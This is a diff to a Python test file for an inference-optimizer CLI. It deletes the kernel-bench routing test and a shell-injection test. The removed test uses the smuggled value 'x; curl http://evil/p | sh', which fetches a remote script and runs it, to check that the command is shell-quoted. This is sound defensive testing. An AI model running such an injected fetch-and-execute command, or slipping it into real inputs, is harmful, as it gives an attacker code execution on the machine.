@@ -1011,7 +1011,7 @@ def test_infera_build_node_launch_args_sglang_and_kill_only():
     assert "--model" not in k
 
 
-# Infera kernel ops routing/isolation (apply-patch / kernel-bench / install-geak).
+# Infera kernel ops routing/isolation (apply-patch / install-geak).
 
 
 def test_resolve_geak_src_resolution_order(monkeypatch):
@@ -1057,33 +1057,6 @@ def test_apply_patch_routes_to_infera_only_when_backend_infera(tmp_path, monkeyp
     sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
     sp.chmod(0o600)
     assert mn_cli.cmd_apply_patch(ns) == mn_cli.EXIT_CONFIG_ERROR  # legacy path
-
-
-def test_kernel_bench_routes_to_infera_only_when_backend_infera(tmp_path, monkeypatch):
-    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
-
-    sp = tmp_path / "s.json"
-    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
-    monkeypatch.setattr(mn_cli, "_infera_kernel_bench", lambda a: 7777)
-
-    ns = argparse.Namespace(
-        workspace="/w",
-        bench_command="true",
-        files_b64_json="{}",
-        result_glob="*.json",
-        timeout_sec=60,
-        print_logs=False,
-        poll_interval=6,
-        poll_timeout=110,
-    )
-    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    assert mn_cli.cmd_kernel_bench(ns) == 7777
-    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    assert mn_cli.cmd_kernel_bench(ns) == mn_cli.EXIT_CONFIG_ERROR
 
 
 def test_install_geak_best_effort_noop_for_rayjob(tmp_path, monkeypatch):
@@ -1439,27 +1412,6 @@ def test_infera_build_node_launch_args_rejects_denied_extra_args():
             nnodes=1,
             extra_args="--model-path /evil",
         )
-
-
-def test_multinode_op_args_shlex_quotes_malicious_value():
-    """The Infera SSH op_args builder path (bench) must also shlex-quote."""
-    import shlex
-
-    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
-
-    evil = "x; curl http://evil/p | sh"
-    ns = argparse.Namespace(
-        workspace="/w",
-        bench_command=evil,
-        files_b64_json="{}",
-        result_glob="*.json",
-        timeout_sec=60,
-    )
-    ep = mn_cli._build_multinode_kernel_bench_entrypoint(
-        ns.workspace, ns.bench_command, ns.files_b64_json, ns.result_glob, ns.timeout_sec
-    )
-    assert shlex.quote(evil) in ep
-    assert f"--bench-command {evil}" not in ep
 
 
 def _bootstrap_sh() -> Path:
